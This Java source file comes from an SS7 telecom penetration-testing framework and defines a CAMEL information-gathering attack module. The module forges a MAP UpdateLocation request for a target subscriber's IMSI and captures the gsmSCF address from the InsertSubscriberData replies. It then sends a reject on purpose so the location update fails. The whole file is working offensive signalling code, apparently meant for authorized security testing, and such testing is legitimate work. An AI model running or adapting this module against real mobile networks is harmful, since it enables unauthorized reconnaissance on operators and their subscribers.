/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.infogathering;

import com.rodan.intruder.ss7.entities.event.model.error.DialogUserAbort;
import com.rodan.intruder.ss7.entities.event.model.error.details.ReturnErrorProblemType;
import com.rodan.intruder.ss7.entities.event.model.mobility.IsdRequest;
import com.rodan.intruder.ss7.entities.event.model.mobility.UlResponse;
import com.rodan.intruder.ss7.entities.event.service.MapMobilityServiceListener;
import com.rodan.intruder.ss7.entities.payload.mobility.IsdResponsePayload;
import com.rodan.intruder.ss7.entities.payload.mobility.UlPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.CamelInfoResponse;
import com.rodan.intruder.ss7.usecases.model.infogathering.CamelInfoOptions;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.ErrorCode;
import com.rodan.library.model.error.SystemException;
import com.rodan.library.model.notification.NotificationType;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.CAMEL_INFO_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.CAMEL_INFO_DISPLAY_NAME, brief = Ss7ModuleConstants.CAMEL_INFO_BRIEF,
        description = Ss7ModuleConstants.CAMEL_INFO_DESCRIPTION, rank = Ss7ModuleConstants.CAMEL_INFO_RANK,
        mainPayload = Constants.RESTORE_DATA_PAYLOAD_NAME)
public class CamelInfoModule extends Ss7ModuleTemplate implements SignalingModule, MapMobilityServiceListener {
    final static Logger logger = LogManager.getLogger(CamelInfoModule.class);

    @Builder
    public CamelInfoModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (CamelInfoOptions) moduleOptions;
        var payload = UlPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .imsi(options.getImsi())
                .cc(options.getCc()).ndc(options.getNdc()).mcc(options.getMcc()).mnc(options.getMnc())
                .mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addMobilityServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeMobilityServiceListener(localSsn, this);
        }
    }

    // TODO SS7: change method signature to throws SystemException instead of SneakyThrows
    @Override
    public void onInsertSubscriberDataRequest(IsdRequest request) {
        try {
            logger.debug("##### Received SAI response!");
            logger.debug(request);
            logger.debug("Parsing response.");
            var dialog = request.getDialog();
            var invokeId = request.getInvokeId();
            dialog.setUserObject(invokeId);

            var gsmScf = request.getGsmScf();
            if (StringUtils.isNotBlank(gsmScf)) {
                // Avoid sending response after getting CAMEL info to fail the UL procedure
                // TODO better to send abort
                getGateway().sendRejectComponent(dialog, invokeId, ReturnErrorProblemType.UnexpectedError);
                moduleResponse = CamelInfoResponse.builder().gsmScf(request.getGsmScf()).build();
                setResultReceived(true);

            } else {
                // Camel info may be sent in subsequent ISDs
                var idsResponsePayload = IsdResponsePayload.builder().invokeId(invokeId).build();
                getGateway().addToDialog(idsResponsePayload, dialog);
                getGateway().send(dialog);
                logger.debug("ISD response sent.");
            }

        } catch (SystemException e) {
            String msg = "Failed to handle ISD request.";
            logger.error(msg, e);
            notify(msg, NotificationType.FAILURE);
            setExecutionError(true);
        }
    }

    @Override
    public void onUpdateLocationResponse(UlResponse response) throws SystemException {
        logger.debug("##### Received UL response!");
        logger.debug(response);
        // If UL response received, this means that gsmSCF was not found in ISD requests
        var msg = "gsmSCF address not found in ISD messages";
        notify(msg, NotificationType.FAILURE);
        setExecutionError(true);
        throw SystemException.builder().code(ErrorCode.MODULE_RESPONSE_ERROR).message(msg).build();
    }

    @Override
    public void onDialogUserAbort(DialogUserAbort abort) {
        logger.debug("[[[[[[[[[[    onDialogUserAbort      ]]]]]]]]]]");
        String msg = String.format("onDialogUserAbort: [%s]", abort);
        logger.debug(msg);
        msg = String.format("MAP dialog user abort received after sending component reject. Continuing normally...");
        logger.debug(msg);
    }
}
